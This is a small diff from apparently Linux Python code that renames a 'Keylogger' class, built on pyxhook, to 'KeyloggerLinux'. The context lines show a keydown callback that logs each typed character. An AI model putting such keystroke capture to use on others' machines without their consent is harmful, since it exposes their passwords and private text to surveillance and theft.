@@ -11,7 +11,7 @@ def _keydown_callback(key: pyxhook.pyxhook.PyxHookKeyEvent):
 
     logging.debug(chr(key.Ascii))
 
-class Keylogger:
+class KeyloggerLinux:
     """ 
     Logs key events to a file
     """
